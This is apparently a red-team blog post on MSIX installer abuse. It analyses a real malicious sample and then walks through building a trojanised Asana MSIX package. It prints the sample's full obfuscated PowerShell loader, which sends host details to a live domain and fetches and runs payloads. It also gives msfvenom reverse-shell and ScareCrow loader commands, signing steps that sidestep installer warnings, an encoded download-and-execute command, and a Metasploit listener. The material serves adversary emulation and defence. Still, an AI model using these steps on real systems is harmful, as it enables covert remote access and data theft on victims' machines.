---
title: "Creating malicious .MSIX files for initial access"
date: 2024-11-12T23:43:31+03:00
tags: ["cybersecurity"]
draft: false
#Decide to delete draft or change it to false in order to display post on website
---

---

![msix1](https://github.com/user-attachments/assets/29621ee8-2024-4789-b61b-7aab24927f0d)

> ### Table of Contents

- [Introduction](#introduction)
- [The MSIX File Format](#the-msix-file-format)
  - [Package Payload](#package-payload)
  - [Footprint Files](#footprint-files)
- [Package Support Framework](#package-support-framework)
  - [StartingScriptWrapper.ps1](#startingscriptwrapperps1)
- [Analysis of a malicious sample](#analysis-of-a-malicious-sample)
  - [AppxManifest](#appxmanifest)
  - [Config.json](#configjson)
  - [StartingScriptWrapper](#startingscriptwrapper)
  - [usJzY The Target Script](#usjzy-the-target-script)
- [Building a malicious msix for Initial Access](#building-a-malicious-msix-for-initial-access)
  - [Setting up the MSIX packaging tool and our setup file](#setting-up-the-msix-packaging-tool-and-our-setup-file)
  - [The implant being staged](#the-implant-being-staged)
  - [Create an SSL certificate](#create-an-ssl-certificate)
  - [Bundle the package and stage our loader](#bundle-the-package-and-stage-our-loader)
- [Testing our malicious sample](#testing-our-malicious-sample)

## Introduction

- I recently worked on a project involving adversary emulation of the `BlackCat/ALPHV ransomware operation`. Part of the observed TTPs was abuse of the MSIX file format to create malware for initial access. These files come in (.msix) file extension which is a Windows installer package.
- In this article, we will go over the `.msix` file format to understand how exactly this package format can be used to execute malicious code on an unsuspecting victim. We will then analyze a malicious sample and further attempt to recreate and test it in a virtual environment.

## The MSIX File Format

- Packaging of files in Windows has undergone several changes over the course of years which has led to the rise of various packaging file formats such as the `EXE, MSI, APPX` and a newer generation such as the MSIX which combines features from the MSI and the APPX packaging.

- Packaging is important for delivery and distribution of applications as it enables a simplified way of deploying and installing files by packaging all the necessary components and libraries into a single package that is straightforward to use.
- The general MSIX file format can be deconstructed as shown:

![msix2](https://github.com/user-attachments/assets/0dfcff2d-459c-4ae2-8fa7-02691754650b)

### Package Payload

- `Application Files`: This section contains the necessary applications required for the packaged application to run. These can be EXEs, DLLs, Config files, resource files or any other type of file.

### Footprint Files

- `AppxManifest.xml`: This file contains metadata about the app package such as the entry points, capabilities, names of the package, version, publisher, dependencies, etc.
- `AppxBlockMap.xml`: To ensure file integrity, this file will contain the checksums of all the files in the package
- `AppxSignature.p7x`: The digital signature verifying the publisher’s identity and ensures that a package has not been tampered with
- `CodeIntegrity.cat`: This file keeps a cryptographic catalogue file(hence the extension name) to ensure integrity and security of the package

## Package Support Framework

- The `Package Support Framework (PSF)`, is an open source kit in windows designed to facilitate installation and operation of applications in Windows. It helps one apply fixes to an application without modifying code.
- It allows for extensive configuration to tailor the behaviour of applications. This customization allows resolving of specific compatibility issues without needing to modify the original code.

![msix3](https://github.com/user-attachments/assets/f2c7cabe-6330-4bd1-a58d-e11b0a5f2d6e)

- In the diagram above, we see the interaction between the PSF and the packaged application at runtime. Let’s discuss the various components.

  - `Config.JSON`: Contains settings and parameters for the PSF.
  - `PsfLauncher.exe`: The initial launcher that initiates the framework.
  - `Runtime Manager dll`: Dll responsible for managing runtime operations within the framework
  - `Runtime fix dll`: Dll that provides runtime fixes and patches required by the application

### StartingScriptWrapper.ps1

- `PSF` can be used to define post-installation scripts, which will be executed either before or after the application that was packaged has been run.
- To perform this, a configuration item called the `StartingScriptWrapper` can be defined to tell PSF to run a script after the packaged application finishes installing.
- We can use this to run scripts to stage our implants for Initial Access

## Analysis of a malicious sample

- Let us look at a malicious [sample](https://bazaar.abuse.ch/verify-ua/) from malwarebazaar.
- Once you’ve downloaded and unzipped the sample, you will be presented with the following folder structure.

![msix4](https://github.com/user-attachments/assets/8657d334-40b2-44bd-bce6-6fddaa93548f)

- In this example, the packaged msix does not contain the target application being installed (it was probably omitted by the original poster) but, it utilizes the Package Support Framework. We can see the psflauncher and the necessary DLLs to ensure its correct functionality. So we know that the malware is going to be executing a script when it is installed on a system.

- 4 files are of interest to us:

  1.  AppxManifest
  2.  Config.json
  3.  StartingScriptWrapper
  4.  usJzY The Target Script

### AppxManifest

- I highlighted 2 important sections here. The properties and the applications section.

![msix5](https://github.com/user-attachments/assets/13fdc262-1d82-4e06-a7a9-b6b35aa1d40c)

- The `properties` section contains details identifying the application such as the name, description and the logo that the app uses.
- In the `applications` section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder.
- The `Capabilities section` is used to specify system capabilities that the application requires in order to grant it access to some system resources and functionalities. Our malware is requesting full trust/unrestricted access to system resources via the `runFullTrust` capability.

### Config.json

- This is where things start to get interesting. We can see the various parameters being used in the configuration

![msix6](https://github.com/user-attachments/assets/07e29470-cc18-4176-be78-c66130ff22a5)

1. The PSF executable will be launched.
2. `scriptExecutionMode` has been set to `RemoteSigned`, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher.
3. The `start script` section defines usJzY.ps1 as the script that will be executed at the start.
4. `showWindow` has been set to `false`, meaning the powershell script will run in the background without invoking the command window.

### StartingScriptWrapper

- The `StartingScriptWrapper` is required by the PSF to be able to run the target script. The file below is included by default without any special modifications.

![msix7](https://github.com/user-attachments/assets/7ccdd0c6-1211-45f7-9598-de608f6c0d31)

### usJzY The Target Script

- Finally, we have the target script that is being executed by PSF.

```s
$udGXjGVXGXbtYwiRfqjVk = Start-Job -ScriptBlock {
    $SyXSoDNGGAhAAe = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    $Cg = '25'
    $BmeBoy = '39b24536-f33f-48ee-9d63-4723e42e16f9'
    $hr = [System.Net.WebUtility]::UrlEncode($SyXSoDNGGAhAAe)
    $hhowUyysZxUVhmaQelBiPDRiUn = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Domain
    $LhvJgxbikeJRfx = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
    $JDJDUfKZAfHGJBoPloDnifXiw = $LhvJgxbikeJRfx | ForEach-Object {
        $_.displayName
    }
    $mYoLehsZuDcJpwtZYnRgAIIgo = $JDJDUfKZAfHGJBoPloDnifXiw -join ", "
    $lXDhTMDJqSAFnn = "w"
    $HKDoaKaxv = (New-Guid).ToString()
    $aTebwwaowsbbrUUTopUZpsjZ = New-Object Net.WebClient
    $aTebwwaowsbbrUUTopUZpsjZ.Headers.Add("User-Agent", "myUserAgentHere")
    $YpU = "?oELLrQJKoZhtDhWs=$mYoLehsZuDcJpwtZYnRgAIIgo&UyMWxrWzgLjhkx=$hhowUyysZxUVhmaQelBiPDRiUn&dVLdrGnckGwZJ=$hr&vKRZZRK=$($Cg)&pHHpfHApJIsnDpyQxHyJTHfM=$BmeBoy&File=file&AeAypRLxCibLOehARxuqWNR=$lXDhTMDJqSAFnn&IhU=$HKDoaKaxv"
    $UJOBBmKBtPlyyQBndyytBczBv = "htt"+"p"+"s://"+"eprst251.boo/73689d8a"+"-"+"25b4"+"-"+"41cf"+"-"+"b693"+"-"+"05591ed804a7"+"-"+"7433f7b1"+"-"+"9997"+"-"+"477b"+"-"+"aadc"+"-"+"5a6e8d233c61" + "$($YpU)"
    $xsLfdudkQBktwfQQjItfw = $aTebwwaowsbbrUUTopUZpsjZ.DownloadString($UJOBBmKBtPlyyQBndyytBczBv)
    $viSrdkNrrPrYdF = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($xsLfdudkQBktwfQQjItfw))
    $gysZgsffxZppKIgfHU = "usradm"
    if ($viSrdkNrrPrYdF.Contains($gysZgsffxZppKIgfHU)) {

        try {

            $LQ = "RpVpRNJ.ps1"
            $K = "C:\ProgramData\$($LQ)"
            $viSrdkNrrPrYdF | Out-File -FilePath $K
            $CoNC = $LQ
            $YpU = "?KblgSClgegJMev=$($LQ)&pHHpfHApJIsnDpyQxHyJTHfM=$($BmeBoy)"
            $BvikSaFXwYDk = "htt"+"p"+"s://"+"eprst251.b"+"o"+""+"o"+"/bb9c1a14-4e3d-40ab-bcc8-0b84e78255b0-4bed9ff2-0f4e-48fb-92ed-1065fcd85e01" + "$($YpU)"
            $xsLfdudkQBktwfQQjItfw = $aTebwwaowsbbrUUTopUZpsjZ.DownloadString($BvikSaFXwYDk)
            $viSrdkNrrPrYdF = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($xsLfdudkQBktwfQQjItfw))
            Invoke-Expression $viSrdkNrrPrYdF
        }
        catch {
            $HcEAjXEDFgAUtMMiPwLicU = $_.Exception.Message
            $icFJZsoaoaorsrDtZWvtoFQitW = "?IhU=$($HKDoaKaxv)&HZsZsos=$($HcEAjXEDFgAUtMMiPwLicU)"
            $jmtjjvjr = "htt"+"p"+"s://"+""+"e"+"prst251.boo/223dc805-5605-4a0b-b828-cdad1b84126"+"e"+"-79d39c2c-0f10-48d1-9"+"e"+"df-c18a784"+"e"+"fba0" + "$($icFJZsoaoaorsrDtZWvtoFQitW)"
            $xsLfdudkQBktwfQQjItfw = $aTebwwaowsbbrUUTopUZpsjZ.DownloadString($jmtjjvjr)
            try {
                $NToddpkHJ = "?aklshdjahsjdh=$($Cg)&ajhsdjhasjhd=nsp&ahsdjkasjkdh=$($($HKDoaKaxv))"
                $NQdQ = "htt"+"p"+"s://"+""+"e"+""+"p"+""+"r"+""+"s"+""+"t"+""+"2"+""+"5"+""+"1"+""+"."+""+"b"+""+"o"+""+"o"+""+"/"+""+"9"+""+"7"+""+"4"+""+"a"+""+"f"+""+"a"+""+"0"+""+"a"+""+"-"+""+"d"+""+"3"+""+"3"+""+"4"+""+"-"+""+"4"+""+"8"+""+"e"+""+"c"+""+"-"+""+"a"+""+"0"+""+"d"+""+"4"+""+"-"+""+"4"+""+"c"+""+"c"+""+"1"+""+"4"+""+"e"+""+"f"+""+"a"+""+"7"+""+"3"+""+"0"+""+"c"+""+"-"+""+"1"+""+"d"+""+"3"+""+"d"+""+"0"+""+"4"+""+"4"+""+"a"+""+"-"+""+"e"+""+"6"+""+"5"+""+"4"+""+"-"+""+"4"+""+"1"+""+"e"+""+"3"+""+"-"+""+"a"+""+"d"+""+"3"+""+"2"+""+"-"+""+"3"+""+"8"+""+"a"+""+"2"+""+"9"+""+"3"+""+"4"+""+"3"+""+"9"+""+"3"+""+"e"+""+"4"+"" + "$($NToddpkHJ)"
                $xsLfdudkQBktwfQQjItfw = $aTebwwaowsbbrUUTopUZpsjZ.DownloadString($NQdQ)
                $viSrdkNrrPrYdF = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($xsLfdudkQBktwfQQjItfw))
                Invoke-Expression $viSrdkNrrPrYdF
            }
            catch {
                $HcEAjXEDFgAUtMMiPwLicU = $_.Exception.Message
                $icFJZsoaoaorsrDtZWvtoFQitW = "?IhU=$($HKDoaKaxv)&HZsZsos=$($HcEAjXEDFgAUtMMiPwLicU)"
                $jmtjjvjr = "htt"+"p"+"s://"+""+"e"+"prst251.boo/223dc805-5605-4a0b-b828-cdad1b84126"+"e"+"-79d39c2c-0f10-48d1-9"+"e"+"df-c18a784"+"e"+"fba0" + "$($icFJZsoaoaorsrDtZWvtoFQitW)"
                $xsLfdudkQBktwfQQjItfw = $aTebwwaowsbbrUUTopUZpsjZ.DownloadString($jmtjjvjr)
            }
        }
    } else {
        try {

            Invoke-Expression $viSrdkNrrPrYdF
        }
        catch {

            $HcEAjXEDFgAUtMMiPwLicU = $_.Exception.Message
            $icFJZsoaoaorsrDtZWvtoFQitW = "?IhU=$($HKDoaKaxv)&HZsZsos=$($HcEAjXEDFgAUtMMiPwLicU)"
            $jmtjjvjr = "htt"+"p"+"s://"+""+"e"+"prst251.boo/223dc805-5605-4a0b-b828-cdad1b84126"+"e"+"-79d39c2c-0f10-48d1-9"+"e"+"df-c18a784"+"e"+"fba0" + "$($icFJZsoaoaorsrDtZWvtoFQitW)"
            $xsLfdudkQBktwfQQjItfw = $aTebwwaowsbbrUUTopUZpsjZ.DownloadString($jmtjjvjr)
            try {
                $NToddpkHJ = "?aklshdjahsjdh=$($Cg)&ajhsdjhasjhd=nsp&ahsdjkasjkdh=$($($HKDoaKaxv))"
                $NQdQ = "htt"+"p"+"s://"+""+"e"+""+"p"+""+"r"+""+"s"+""+"t"+""+"2"+""+"5"+""+"1"+""+"."+""+"b"+""+"o"+""+"o"+""+"/"+""+"9"+""+"7"+""+"4"+""+"a"+""+"f"+""+"a"+""+"0"+""+"a"+""+"-"+""+"d"+""+"3"+""+"3"+""+"4"+""+"-"+""+"4"+""+"8"+""+"e"+""+"c"+""+"-"+""+"a"+""+"0"+""+"d"+""+"4"+""+"-"+""+"4"+""+"c"+""+"c"+""+"1"+""+"4"+""+"e"+""+"f"+""+"a"+""+"7"+""+"3"+""+"0"+""+"c"+""+"-"+""+"1"+""+"d"+""+"3"+""+"d"+""+"0"+""+"4"+""+"4"+""+"a"+""+"-"+""+"e"+""+"6"+""+"5"+""+"4"+""+"-"+""+"4"+""+"1"+""+"e"+""+"3"+""+"-"+""+"a"+""+"d"+""+"3"+""+"2"+""+"-"+""+"3"+""+"8"+""+"a"+""+"2"+""+"9"+""+"3"+""+"4"+""+"3"+""+"9"+""+"3"+""+"e"+""+"4"+"" + "$($NToddpkHJ)"
                $xsLfdudkQBktwfQQjItfw = $aTebwwaowsbbrUUTopUZpsjZ.DownloadString($NQdQ)
                $viSrdkNrrPrYdF = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($xsLfdudkQBktwfQQjItfw))
                Invoke-Expression $viSrdkNrrPrYdF
            }
            catch {
                $HcEAjXEDFgAUtMMiPwLicU = $_.Exception.Message
                $icFJZsoaoaorsrDtZWvtoFQitW = "?IhU=$($HKDoaKaxv)&HZsZsos=$($HcEAjXEDFgAUtMMiPwLicU)"
                $jmtjjvjr = "htt"+"p"+"s://"+""+"e"+"prst251.boo/223dc805-5605-4a0b-b828-cdad1b84126"+"e"+"-79d39c2c-0f10-48d1-9"+"e"+"df-c18a784"+"e"+"fba0" + "$($icFJZsoaoaorsrDtZWvtoFQitW)"
                $xsLfdudkQBktwfQQjItfw = $aTebwwaowsbbrUUTopUZpsjZ.DownloadString($jmtjjvjr)
            }
        }
    }
}

$JNWgNBrgNHmJNEDiBS= "htt"+"p"+"s://"+"asana.co"+"m"+"/"
Start-Process $JNWgNBrgNHmJNEDiBS

Receive-Job -Job $udGXjGVXGXbtYwiRfqjVk -Wait
```

- In summary, this is what the script is performing:

  1.  Starts as a background job and collects some system information such as the domain name, AV software present in the system and the domain name (line 2-11)
  2.  Pulls a suspicious script from a remote URL and executes it. (line 20-80)
  3.  Finally opens https://asana.com in the browser then waits for the background job to finish executing before exiting.

- This is what will contain the main logic for the implant being staged.

## Building a malicious msix for Initial Access

- Now that we have a solid understanding of the file structure. Let us construct our own malicious MSIX payload that installs an application before executing our target malware.

### Setting up the MSIX packaging tool and our setup file

- First, you will need to install the `MSIX packaging tool` from the Microsoft Store.

![msix8](https://github.com/user-attachments/assets/7dbce949-2533-4cad-a1a8-f8a3f749569d)

- You will also need the target application being packaged. I used Asana for this example.

### The implant being staged

- We can quickly create a simple implant for the initial access. I will utilize an awesome repo called Scarecrow which I came across a while back that can create payloads that mimics reputable sources.
- We create our shellcode with msfvenom.

```s
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.75.128 LPORT=9001 -f raw > protection.bin
```

- Then generate the loader using Scarecrow.

```s
./scarecrow -I protection.bin -domain www.microsoft.com -encryptionmode AES
```

![msix9](https://github.com/user-attachments/assets/93b4e2a2-616e-4253-9362-acf0273d7910)

- Host the final loader.

![msix10](https://github.com/user-attachments/assets/488febe7-dc68-46c8-ac93-a63680a57d77)

### Create an SSL certificate

- When running the MSIX file, Windows will check for the `digital signature` of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.
- Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own `self-signed certificate`, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors.

1. Create a new self-signed certificate

```s
New-SelfSignedCertificate -CertStoreLocation "Cert:\CurrentUser\My" -TextExtension @("2.5.29.37={text}1.3.6.1.5.5.7.3.3", "2.5.29.19={text}")-Type Custom -KeyUsage DigitalSignature -Subject "Asana LLC" -FriendlyName "Asana LLC"
```

Subject must much the MSIX’s Publisher attribute value.

- You can find the thumbprint of the certificate like this.

```s
Set-Location Cert:\CurrentUser\My
Get-ChildItem | Format-Table Subject, FriendlyName, Thumbprint
```

2. Export the private key which we will use to sign the MSIX

```s
$password = ConvertTo-SecureString -Force -AsPlainText -String pass123
Export-PfxCertificate -Password $password -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792" -FilePath  C:\Users\Saudi\cert.pfx
```

3. Export the public key which we will install in the victim’s computer

```s
Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792" -FilePath 'C:\Users\Saudi\cert.cer'
```

![msix11](https://github.com/user-attachments/assets/1d359d10-934b-4d8f-9d80-80a17ba83122)

- Since this is a self-signed SSL for testing purposes, you can install the security certificate on the victim as shown:

![msix12](https://github.com/user-attachments/assets/472506d4-908e-4b88-9f93-4c5387878582)

![msix13](https://github.com/user-attachments/assets/e9cb4135-88c0-4063-a104-8e01ac0be8f5)

- Install the cert in the Trusted Root Certification Authorities.

![msix14](https://github.com/user-attachments/assets/8e610224-54a8-4b56-b707-b2b8fe8ad764)

### Bundle the package and stage our loader

- Select the task and follow through the prompts

![msix15](https://github.com/user-attachments/assets/5a1bda1e-473f-4166-9e42-71ed27a90b4a)

- Select the Asana setup file as the installer being packaged and select the pfx certificate we generated.

![msix16](https://github.com/user-attachments/assets/b4a80e28-213e-40e4-be4b-796179b1badd)

- You can skip the Accelerator section. The package will automatically install in the system as shown.

![msix17](https://github.com/user-attachments/assets/178734e3-2caa-4322-9a49-9370c3497f5c)

- Ensure the package has an entry point as shown. We will edit the entry point in the manifest file later on to point to our psflauncher executable.

![msix18](https://github.com/user-attachments/assets/ecad109a-9e98-4dc3-96ba-f9a006c081bf)

- Here in the Create New Package Section, we go to the package editor to add the PSF binaries and config file to our package to give it PSF support.

![msix19](https://github.com/user-attachments/assets/093ba4d5-8081-4653-ab18-8a956d5df20a)

- In the package editor, click on package files, right-click on the “Package” and add the following appropriate files.

![msix20](https://github.com/user-attachments/assets/ba54db86-765a-492f-9ead-2bc259dcd86d)

![msix21](https://github.com/user-attachments/assets/9482cf66-032b-4f62-b6fd-7fbdbf388c47)

- You can edit files directly in the package editor by right-clicking and selecting edit. Let’s modify the config file to point to our staging script called Hotfix.ps1. In this example, I enabled the powershell window to debug any errors.

```json
{
  "applications": [
    {
      "id": "ASANA",
      "executable": "asana.exe",
      "scriptExecutionMode": "-ExecutionPolicy Unrestricted",
      "startScript": {
        "waitForScriptToFinish": true,
        "runOnce": false,
        "timeOut": 30000,
        "showWindow": true,
        "scriptPath": "Hotfix.ps1"
      }
    }
  ]
}
```

- Create the `hotfix.ps1` file in a different window. We will add a powershell command that pulls our loader from the staging server and executes it.

![msix22](https://github.com/user-attachments/assets/7f27e44c-9d03-47e8-9a63-7b9fb47e95fa)

```s
powershell -enc "dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADEAMgA4AC8AMgA0ADoAOQAwADAAMQAvAEgAbwB0AGYAaQB4AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADUAOwBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA="
```

- Add the `hotfix.ps1` staging script.

![msix23](https://github.com/user-attachments/assets/812e7559-2432-4c76-902e-15e6c7c75c69)

- Back to the manifest file, let’s change the launch executable to our PSF binary so that the hotfix.ps1 can be executed post install.

![msix24](https://github.com/user-attachments/assets/dfc715ea-23b0-489f-a08d-4c3f6046575f)

- In this section, take note of the Application ID defined. We will also modify the executable value.

![msix25](https://github.com/user-attachments/assets/ee9660d2-391c-4f20-9c91-41bc06b929ea)

- Change it to point to the psf executable:

![msix26](https://github.com/user-attachments/assets/1d23ac8d-fe99-4308-9880-18486872435f)

- Save and exit. Finally create your MSIX file.

## Testing our malicious sample

> **Alert** `Ensure that the Asana application is not installed in the system`

![msix27](https://github.com/user-attachments/assets/a3c179c8-fb21-4dae-9b31-b35074c37be5)

- Setup our listener.

```s
msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.71;set LPORT 9001; set EXITFUNC thread; set EXITONSESSION false; exploit -j" 2>&1
```

![msix28](https://github.com/user-attachments/assets/6c698052-9a7c-4657-82c8-d9a55f9d8462)

- Run the MSIX installation and catch your shell.

![msix29](https://github.com/user-attachments/assets/80617c17-d3dd-4465-aafc-fb2a9e7b67dc)

- Happy pentesting!
